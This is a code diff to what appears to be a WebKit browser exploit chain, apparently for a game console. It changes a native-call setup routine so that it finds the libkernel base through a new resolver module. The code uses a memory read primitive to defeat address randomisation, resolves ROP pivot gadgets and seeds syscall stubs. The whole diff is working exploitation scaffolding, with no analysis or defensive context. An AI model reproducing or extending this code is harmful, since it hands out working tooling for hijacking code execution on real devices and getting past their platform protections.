@@ -7,6 +7,7 @@ import {
     PIVOT_ROWS,
     verifyPivotSet,
 } from "./pivot_gadgets.js";
+import { resolveLibkernel } from "./libkernel_resolve.js";
 
 export const SYS = {
     getpid: 20,
@@ -147,7 +148,9 @@ function put(dv, at, v) {
 export function initNativeCall(p, off, opts) {
     opts = opts || {};
     const log = opts.log || (() => {});
-    const trust = opts.trust === true;
+    const trustGadgets = opts.trustGadgets === true || opts.trust === true;
+    const trustStubs = opts.trustStubs === true;
+    const noStubScan = opts.noStubScan === true;
 
     let webkitBase = opts.webkitBase || null;
     if (!webkitBase && opts.nativeFn && off.wk_expm1_builtin)
@@ -173,14 +176,20 @@ export function initNativeCall(p, off, opts) {
 
     let libkernelBase = opts.libkernelBase || null;
     if (!libkernelBase) {
-        if (!off.wk___imp___error || !off.k__error)
-            throw new Error("native_call: missing wk___imp___error / k__error");
-        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
-        libkernelBase = errorFn.sub32(off.k__error);
+        const lk = resolveLibkernel(p, webkitBase, off, {
+            log,
+            allowScan: false,
+            read8: (pp, a) => {
+                try { return pp.read8(a); } catch (_) { return null; }
+            },
+        });
+        if (!lk.ok)
+            throw new Error(lk.error || "libkernel resolve failed");
+        libkernelBase = lk.lk;
     }
     log("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
 
-    const resolved = trust
+    const resolved = trustGadgets
         ? resolveGadgetsTrust(webkitBase, off)
         : resolveGadgets(p, webkitBase, off);
     const G = resolved.G;
@@ -188,9 +197,10 @@ export function initNativeCall(p, off, opts) {
         throw new Error("gadget-bad: " + (resolved.bad || ["?"]).join(","));
 
     const stubOpts = {
-        trustStubs: trust || opts.trustStubs,
-        noStubScan: trust || opts.noStubScan,
+        trustStubs,
+        noStubScan,
         stubScanMax: opts.stubScanMax,
+        getpidOnly: opts.getpidOnly,
     };
     const { stubAddr, seeded, scanned, missing } = seedStubs(p, libkernelBase, off, stubOpts);
     log("STUBS", "seeded=" + seeded + " scanned=" + scanned
